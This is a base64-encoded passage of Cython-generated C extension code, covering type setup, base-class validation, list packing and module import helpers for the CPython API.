RURfQVBJCiAgICB0cF9kaWN0ID0gX19QeXhfR2V0VHlwZURpY3QodHApOwogICAgaWYgKHVubGlrZWx5KCF0cF9kaWN0KSkgcmV0dXJuIC0xOwojZWxzZQogICAgdHBfZGljdCA9IHRwLT50cF9kaWN0OwojZW5kaWYKICAgIHJlc3VsdCA9IFB5RGljdF9TZXRJdGVtKHRwX2RpY3QsIGssIHYpOwogICAgaWYgKGxpa2VseSghcmVzdWx0KSkgewogICAgICAgIFB5VHlwZV9Nb2RpZmllZCh0cCk7CiAgICAgICAgaWYgKHVubGlrZWx5KFB5T2JqZWN0X0hhc0F0dHIodiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NldF9uYW1lKSkpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnNldE5hbWVSZXN1bHQgPSBQeU9iamVjdF9DYWxsTWV0aG9kT2JqQXJncyh2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2V0X25hbWUsICAoUHlPYmplY3QgKikgdHAsIGssIE5VTEwpOwogICAgICAgICAgICBpZiAoIXNldE5hbWVSZXN1bHQpIHJldHVybiAtMTsKICAgICAgICAgICAgUHlfREVDUkVGKHNldE5hbWVSZXN1bHQpOwogICAgICAgIH0KICAgIH0KICAgIHJldHVybiByZXN1bHQ7Cn0KCgpzdGF0aWMgaW50IF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoUHlUeXBlX1NwZWMgKnNwZWMsIFB5VHlwZU9iamVjdCAqdHlwZSkgewojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwOTAwQjEKICAgIENZVEhPTl9VTlVTRURfVkFSKHNwZWMpOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIodHlwZSk7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QpOwojZWxzZQogICAgY29uc3QgUHlUeXBlX1Nsb3QgKnNsb3QgPSBzcGVjLT5zbG90czsKICAgIGludCBjaGFuZ2VkID0gMDsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICB3aGlsZSAoc2xvdCAmJiBzbG90LT5zbG90ICYmIHNsb3QtPnNsb3QgIT0gUHlfdHBfbWVtYmVycykKICAgICAgICBzbG90Kys7CiAgICBpZiAoc2xvdCAmJiBzbG90LT5zbG90ID09IFB5X3RwX21lbWJlcnMpIHsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICBjb25zdAojZW5kaWYgIC8vICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04pCiAgICAgICAgICAgIFB5TWVtYmVyRGVmICptZW1iID0gKFB5TWVtYmVyRGVmKikgc2xvdC0+cGZ1bmM7CiAgICAgICAgd2hpbGUgKG1lbWIgJiYgbWVtYi0+bmFtZSkgewogICAgICAgICAgICBpZiAobWVtYi0+bmFtZVswXSA9PSAnXycgJiYgbWVtYi0+bmFtZVsxXSA9PSAnXycpIHsKICAgICAgICAgICAgICAgIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fd2Vha2xpc3RvZmZzZXRfXyIpID09IDApIHsKICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+dHlwZSA9PSBUX1BZU1NJWkVUKTsKICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpOwogICAgICAgICAgICAgICAgICAgIHR5cGUtPnRwX3dlYWtsaXN0b2Zmc2V0ID0gbWVtYi0+b2Zmc2V0OwogICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSBpZiAoc3RyY21wKG1lbWItPm5hbWUsICJfX2RpY3RvZmZzZXRfXyIpID09IDApIHsKICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+dHlwZSA9PSBUX1BZU1NJWkVUKTsKICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpOwogICAgICAgICAgICAgICAgICAgIHR5cGUtPnRwX2RpY3RvZmZzZXQgPSBtZW1iLT5vZmZzZXQ7CiAgICAgICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7CiAgICAgICAgICAgICAgICB9CiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICAgICAgICAgICAgICAgZWxzZSBpZiAoc3RyY21wKG1lbWItPm5hbWUsICJfX3ZlY3RvcmNhbGxvZmZzZXRfXyIpID09IDApIHsKICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+dHlwZSA9PSBUX1BZU1NJWkVUKTsKICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpOwojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNAogICAgICAgICAgICAgICAgICAgIHR5cGUtPnRwX3ZlY3RvcmNhbGxfb2Zmc2V0ID0gbWVtYi0+b2Zmc2V0OwojZWxzZQogICAgICAgICAgICAgICAgICAgIHR5cGUtPnRwX3ByaW50ID0gKHByaW50ZnVuYykgbWVtYi0+b2Zmc2V0OwojZW5kaWYKICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTsKICAgICAgICAgICAgICAgIH0KI2VuZGlmICAvLyBDWVRIT05fTUVUSF9GQVNUQ0FMTAojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgICAgICAgICAgICAgZWxzZSBpZiAoc3RyY21wKG1lbWItPm5hbWUsICJfX21vZHVsZV9fIikgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpkZXNjcjsKICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+dHlwZSA9PSBUX09CSkVDVCk7CiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPmZsYWdzID09IDAgfHwgbWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpOwogICAgICAgICAgICAgICAgICAgIGRlc2NyID0gUHlEZXNjcl9OZXdNZW1iZXIodHlwZSwgbWVtYik7CiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFkZXNjcikpCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAgICAgICAgICAgICBpbnQgc2V0X2l0ZW1fcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW0odHlwZS0+dHBfZGljdCwgUHlEZXNjcl9OQU1FKGRlc2NyKSwgZGVzY3IpOwogICAgICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7CiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNldF9pdGVtX3Jlc3VsdCA8IDApKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7CiAgICAgICAgICAgICAgICB9CiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgICAgICAgICB9CiAgICAgICAgICAgIG1lbWIrKzsKICAgICAgICB9CiAgICB9CiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKICAgIHNsb3QgPSBzcGVjLT5zbG90czsKICAgIHdoaWxlIChzbG90ICYmIHNsb3QtPnNsb3QgJiYgc2xvdC0+c2xvdCAhPSBQeV90cF9nZXRzZXQpCiAgICAgICAgc2xvdCsrOwogICAgaWYgKHNsb3QgJiYgc2xvdC0+c2xvdCA9PSBQeV90cF9nZXRzZXQpIHsKICAgICAgICBQeUdldFNldERlZiAqZ2V0c2V0ID0gKFB5R2V0U2V0RGVmKikgc2xvdC0+cGZ1bmM7CiAgICAgICAgd2hpbGUgKGdldHNldCAmJiBnZXRzZXQtPm5hbWUpIHsKICAgICAgICAgICAgaWYgKGdldHNldC0+bmFtZVswXSA9PSAnXycgJiYgZ2V0c2V0LT5uYW1lWzFdID09ICdfJyAmJiBzdHJjbXAoZ2V0c2V0LT5uYW1lLCAiX19tb2R1bGVfXyIpID09IDApIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpkZXNjciA9IFB5RGVzY3JfTmV3R2V0U2V0KHR5cGUsIGdldHNldCk7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIWRlc2NyKSkKICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgICAgICAgICAgUHlPYmplY3QgKnB5bmFtZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKGdldHNldC0+bmFtZSk7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIXB5bmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZGVzY3IpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGludCBzZXRfaXRlbV9yZXN1bHQgPSBfX1B5eF9TZXRJdGVtT25UeXBlRGljdCh0eXBlLCBweW5hbWUsIGRlc2NyKTsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihweW5hbWUpOwogICAgICAgICAgICAgICAgI2Vsc2UKICAgICAgICAgICAgICAgIENZVEhPTl9VTlVTRURfVkFSKF9fUHl4X19TZXRJdGVtT25UeXBlRGljdCk7CiAgICAgICAgICAgICAgICBpbnQgc2V0X2l0ZW1fcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW0odHlwZS0+dHBfZGljdCwgUHlEZXNjcl9OQU1FKGRlc2NyKSwgZGVzY3IpOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZGVzY3IpOwogICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNldF9pdGVtX3Jlc3VsdCA8IDApKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgKytnZXRzZXQ7CiAgICAgICAgfQogICAgfQojZW5kaWYgIC8vICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKICAgIGlmIChjaGFuZ2VkKQogICAgICAgIFB5VHlwZV9Nb2RpZmllZCh0eXBlKTsKI2VuZGlmICAvLyBQWV9WRVJTSU9OX0hFWCA+IDB4MDMwOTAwQjEKICAgIHJldHVybiAwOwp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9VU0VfVFlQRV9TUEVDUwpzdGF0aWMgaW50IF9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlKGNvbnN0IGNoYXIgKnR5cGVfbmFtZSwgUHlfc3NpemVfdCBkaWN0b2Zmc2V0LCBQeU9iamVjdCAqYmFzZXMpIHsKICAgIFB5X3NzaXplX3QgaSwgbjsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICBuID0gUHlUdXBsZV9HRVRfU0laRShiYXNlcyk7CiNlbHNlCiAgICBuID0gUHlUdXBsZV9TaXplKGJhc2VzKTsKICAgIGlmICh1bmxpa2VseShuIDwgMCkpIHJldHVybiAtMTsKI2VuZGlmCiAgICBmb3IgKGkgPSAxOyBpIDwgbjsgaSsrKQogICAgewogICAgICAgIFB5VHlwZU9iamVjdCAqYjsKI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgUHlPYmplY3QgKmIwID0gUHlTZXF1ZW5jZV9HZXRJdGVtKGJhc2VzLCBpKTsKICAgICAgICBpZiAoIWIwKSByZXR1cm4gLTE7CiNlbGlmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBQeU9iamVjdCAqYjAgPSBQeVR1cGxlX0dFVF9JVEVNKGJhc2VzLCBpKTsKI2Vsc2UKICAgICAgICBQeU9iamVjdCAqYjAgPSBQeVR1cGxlX0dldEl0ZW0oYmFzZXMsIGkpOwogICAgICAgIGlmICghYjApIHJldHVybiAtMTsKI2VuZGlmCiAgICAgICAgYiA9IChQeVR5cGVPYmplY3QqKSBiMDsKICAgICAgICBpZiAoIV9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKGIsIFB5X1RQRkxBR1NfSEVBUFRZUEUpKQogICAgICAgIHsKICAgICAgICAgICAgX19QeXhfVHlwZU5hbWUgYl9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShiKTsKICAgICAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICJiYXNlIGNsYXNzICciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJyBpcyBub3QgYSBoZWFwIHR5cGUiLCBiX25hbWUpOwogICAgICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoYl9uYW1lKTsKI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgIFB5X0RFQ1JFRihiMCk7CiNlbmRpZgogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgICAgIGlmIChkaWN0b2Zmc2V0ID09IDApCiAgICAgICAgewogICAgICAgICAgICBQeV9zc2l6ZV90IGJfZGljdG9mZnNldCA9IDA7CiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICAgICAgICAgYl9kaWN0b2Zmc2V0ID0gYi0+dHBfZGljdG9mZnNldDsKI2Vsc2UKICAgICAgICAgICAgUHlPYmplY3QgKnB5X2JfZGljdG9mZnNldCA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoKFB5T2JqZWN0KiliLCAiX19kaWN0b2Zmc2V0X18iKTsKICAgICAgICAgICAgaWYgKCFweV9iX2RpY3RvZmZzZXQpIGdvdG8gZGljdG9mZnNldF9yZXR1cm47CiAgICAgICAgICAgIGJfZGljdG9mZnNldCA9IFB5TG9uZ19Bc1NzaXplX3QocHlfYl9kaWN0b2Zmc2V0KTsKICAgICAgICAgICAgUHlfREVDUkVGKHB5X2JfZGljdG9mZnNldCk7CiAgICAgICAgICAgIGlmIChiX2RpY3RvZmZzZXQgPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkgZ290byBkaWN0b2Zmc2V0X3JldHVybjsKI2VuZGlmCiAgICAgICAgICAgIGlmIChiX2RpY3RvZmZzZXQpIHsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9UeXBlTmFtZSBiX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKGIpOwogICAgICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJleHRlbnNpb24gdHlwZSAnJS4yMDBzJyBoYXMgbm8gX19kaWN0X18gc2xvdCwgIgogICAgICAgICAgICAgICAgICAgICAgICAiYnV0IGJhc2UgdHlwZSAnIiBfX1B5eF9GTVRfVFlQRU5BTUUgIicgaGFzOiAiCiAgICAgICAgICAgICAgICAgICAgICAgICJlaXRoZXIgYWRkICdjZGVmIGRpY3QgX19kaWN0X18nIHRvIHRoZSBleHRlbnNpb24gdHlwZSAiCiAgICAgICAgICAgICAgICAgICAgICAgICJvciBhZGQgJ19fc2xvdHNfXyA9IFsuLi5dJyB0byB0aGUgYmFzZSB0eXBlIiwKICAgICAgICAgICAgICAgICAgICAgICAgdHlwZV9uYW1lLCBiX25hbWUpOwogICAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShiX25hbWUpOwogICAgICAgICAgICAgICAgfQojaWYgIUNZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgICAgICAgICAgIGRpY3RvZmZzZXRfcmV0dXJuOgojZW5kaWYKI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoYjApOwojZW5kaWYKICAgICAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAgICAgfQogICAgICAgIH0KI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgUHlfREVDUkVGKGIwKTsKI2VuZGlmCiAgICB9CiAgICByZXR1cm4gMDsKfQojZW5kaWYKCgpDWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfUHlUeXBlX0hhc011bHRpcGxlSW5oZXJpdGFuY2UoUHlUeXBlT2JqZWN0ICp0KSB7CiAgICB3aGlsZSAodCkgewogICAgICAgIFB5T2JqZWN0ICpiYXNlcyA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2VzLCBQeU9iamVjdCopOwogICAgICAgIGlmIChiYXNlcykgewogICAgICAgICAgICByZXR1cm4gMTsKICAgICAgICB9CiAgICAgICAgdCA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopOwogICAgfQogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIGludCBfX1B5eF9QeVR5cGVfUmVhZHkoUHlUeXBlT2JqZWN0ICp0KSB7CiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgfHwgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKFBZU1RPTl9NQUpPUl9WRVJTSU9OKQogICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7CiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAgICh2b2lkKV9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlOwojZW5kaWYKICAgIHJldHVybiBQeVR5cGVfUmVhZHkodCk7CiNlbHNlCiAgICBpbnQgcjsKICAgIGlmICghX19QeXhfUHlUeXBlX0hhc011bHRpcGxlSW5oZXJpdGFuY2UodCkpIHsKICAgICAgICByZXR1cm4gUHlUeXBlX1JlYWR5KHQpOwogICAgfQogICAgUHlPYmplY3QgKmJhc2VzID0gX19QeXhfUHlUeXBlX0dldFNsb3QodCwgdHBfYmFzZXMsIFB5T2JqZWN0Kik7CiAgICBpZiAoYmFzZXMgJiYgdW5saWtlbHkoX19QeXhfdmFsaWRhdGVfYmFzZXNfdHVwbGUodC0+dHBfbmFtZSwgdC0+dHBfZGljdG9mZnNldCwgYmFzZXMpID09IC0xKSkKICAgICAgICByZXR1cm4gLTE7CiNpZiAhZGVmaW5lZChQWVNUT05fTUFKT1JfVkVSU0lPTikKICAgIHsKICAgICAgICBpbnQgZ2Nfd2FzX2VuYWJsZWQ7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBiMQogICAgICAgIGdjX3dhc19lbmFibGVkID0gUHlHQ19EaXNhYmxlKCk7CiAgICAgICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7CiAgICAjZWxzZQogICAgICAgIFB5T2JqZWN0ICpyZXQsICpweV9zdGF0dXM7CiAgICAgICAgUHlPYmplY3QgKmdjID0gTlVMTDsKICAgICAgICAjaWYgKCFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSswID49IDB4MDcwMzA0MDApICYmXAogICAgICAgICAgICAgICAgIUNZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgICAgICBnYyA9IFB5SW1wb3J0X0dldE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2djKTsKICAgICAgICAjZW5kaWYKICAgICAgICBpZiAodW5saWtlbHkoIWdjKSkgZ2MgPSBQeUltcG9ydF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFnYykpIHJldHVybiAtMTsKICAgICAgICBweV9zdGF0dXMgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChnYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9pc2VuYWJsZWQpOwogICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RhdHVzKSkgewogICAgICAgICAgICBQeV9ERUNSRUYoZ2MpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgICAgIGdjX3dhc19lbmFibGVkID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKHB5X3N0YXR1cyk7CiAgICAgICAgUHlfREVDUkVGKHB5X3N0YXR1cyk7CiAgICAgICAgaWYgKGdjX3dhc19lbmFibGVkID4gMCkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChnYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9kaXNhYmxlKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFyZXQpKSB7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZ2MpOwogICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICB9CiAgICAgICAgICAgIFB5X0RFQ1JFRihyZXQpOwogICAgICAgIH0gZWxzZSBpZiAodW5saWtlbHkoZ2Nfd2FzX2VuYWJsZWQgPT0gLTEpKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRihnYyk7CiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICB9CiAgICAjZW5kaWYKICAgICAgICB0LT50cF9mbGFncyB8PSBQeV9UUEZMQUdTX0hFQVBUWVBFOwojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMAogICAgICAgIHQtPnRwX2ZsYWdzIHw9IFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRTsKI2VuZGlmCiNlbHNlCiAgICAgICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7CiNlbmRpZgogICAgciA9IFB5VHlwZV9SZWFkeSh0KTsKI2lmICFkZWZpbmVkKFBZU1RPTl9NQUpPUl9WRVJTSU9OKQogICAgICAgIHQtPnRwX2ZsYWdzICY9IH5QeV9UUEZMQUdTX0hFQVBUWVBFOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwYjEKICAgICAgICBpZiAoZ2Nfd2FzX2VuYWJsZWQpCiAgICAgICAgICAgIFB5R0NfRW5hYmxlKCk7CiAgICAjZWxzZQogICAgICAgIGlmIChnY193YXNfZW5hYmxlZCkgewogICAgICAgICAgICBQeU9iamVjdCAqdHAsICp2LCAqdGI7CiAgICAgICAgICAgIFB5RXJyX0ZldGNoKCZ0cCwgJnYsICZ0Yik7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKGdjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2VuYWJsZSk7CiAgICAgICAgICAgIGlmIChsaWtlbHkocmV0IHx8IHIgPT0gLTEpKSB7CiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHJldCk7CiAgICAgICAgICAgICAgICBQeUVycl9SZXN0b3JlKHRwLCB2LCB0Yik7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHRwKTsKICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodik7CiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHRiKTsKICAgICAgICAgICAgICAgIHIgPSAtMTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoZ2MpOwogICAgI2VuZGlmCiAgICB9CiNlbmRpZgogICAgcmV0dXJuIHI7CiNlbmRpZgp9CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUxpc3RfUGFjayhQeV9zc2l6ZV90IG4sIC4uLikgewogICAgdmFfbGlzdCB2YTsKICAgIFB5T2JqZWN0ICpsID0gUHlMaXN0X05ldyhuKTsKICAgIHZhX3N0YXJ0KHZhLCBuKTsKICAgIGlmICh1bmxpa2VseSghbCkpIGdvdG8gZW5kOwogICAgZm9yIChQeV9zc2l6ZV90IGk9MDsgaTxuOyArK2kpIHsKICAgICAgICBQeU9iamVjdCAqYXJnID0gdmFfYXJnKHZhLCBQeU9iamVjdCopOwogICAgICAgIFB5X0lOQ1JFRihhcmcpOwogICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0obCwgaSwgYXJnKSAhPSAoMCkpIHsKICAgICAgICAgICAgUHlfQ0xFQVIobCk7CiAgICAgICAgICAgIGdvdG8gZW5kOwogICAgICAgIH0KICAgIH0KICAgIGVuZDoKICAgIHZhX2VuZCh2YSk7CiAgICByZXR1cm4gbDsKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0KFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqZnJvbV9saXN0LCBpbnQgbGV2ZWwpIHsKICAgIFB5T2JqZWN0ICptb2R1bGUgPSAwOwogICAgUHlPYmplY3QgKmVtcHR5X2RpY3QgPSAwOwogICAgUHlPYmplY3QgKmVtcHR5X2xpc3QgPSAwOwogICAgZW1wdHlfZGljdCA9IFB5RGljdF9OZXcoKTsKICAgIGlmICh1bmxpa2VseSghZW1wdHlfZGljdCkpCiAgICAgICAgZ290byBiYWQ7CiAgICBpZiAobGV2ZWwgPT0gLTEpIHsKICAgICAgICBjb25zdCBjaGFyKiBwYWNrYWdlX3NlcCA9IHN0cmNocihfX1B5eF9NT0RVTEVfTkFNRSwgJy4nKTsKICAgICAgICBpZiAocGFja2FnZV9zZXAgIT0gKDApKSB7CiAgICAgICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsT2JqZWN0KAogICAgICAgICAgICAgICAgbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgZW1wdHlfZGljdCwgZnJvbV9saXN0LCAxKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSB7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIVB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfSW1wb3J0RXJyb3IpKSkKICAgICAgICAgICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgbGV2ZWwgPSAwOwogICAgfQogICAgaWYgKCFtb2R1bGUpIHsKICAgICAgICBtb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGVMZXZlbE9iamVjdCgKICAgICAgICAgICAgbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgZW1wdHlfZGljdCwgZnJvbV9saXN0LCBsZXZlbCk7CiAgICB9CmJhZDoKICAgIFB5X1hERUNSRUYoZW1wdHlfZGljdCk7CiAgICBQeV9YREVDUkVGKGVtcHR5X2xpc3QpOwogICAgcmV0dXJuIG1vZHVsZTsKfQoKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfSW1wb3J0RnJvbShQeU9iamVjdCogbW9kdWxlLCBQeU9iamVjdCogbmFtZSkgewogICAgUHlPYmplY3QqIHZhbHVlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihtb2R1bGUsIG5hbWUpOwogICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkgJiYgUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19BdHRyaWJ1dGVFcnJvcikpIHsKICAgICAgICBjb25zdCBjaGFyKiBtb2R1bGVfbmFtZV9zdHIgPSAwOwogICAgICAgIFB5T2JqZWN0KiBtb2R1bGVfbmFtZSA9IDA7CiAgICAgICAgUHlPYmplY3QqIG1vZHVsZV9kb3QgPSAwOwogICAgICAgIFB5T2JqZWN0KiBmdWxsX25hbWUgPSAwOwogICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgbW9kdWxlX25hbWVfc3RyID0gUHlNb2R1bGVfR2V0TmFtZShtb2R1bGUpOwogICAgICAgIGlmICh1bmxpa2VseSghbW9kdWxlX25hbWVfc3RyKSkgeyBnb3RvIG1vZGJhZDsgfQogICAgICAgIG1vZHVsZV9uYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcobW9kdWxlX25hbWVfc3RyKTsKICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZV9uYW1lKSkgeyBnb3RvIG1vZGJhZDsgfQogICAgICAgIG1vZHVsZV9kb3QgPSBQeVVuaWNvZGVfQ29uY2F0KG1vZHVsZV9uYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xNCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfZG90KSkgeyBnb3RvIG1vZGJhZDsgfQogICAgICAgIGZ1bGxfbmFtZSA9IFB5VW5pY29kZV9Db25jYXQobW9kdWxl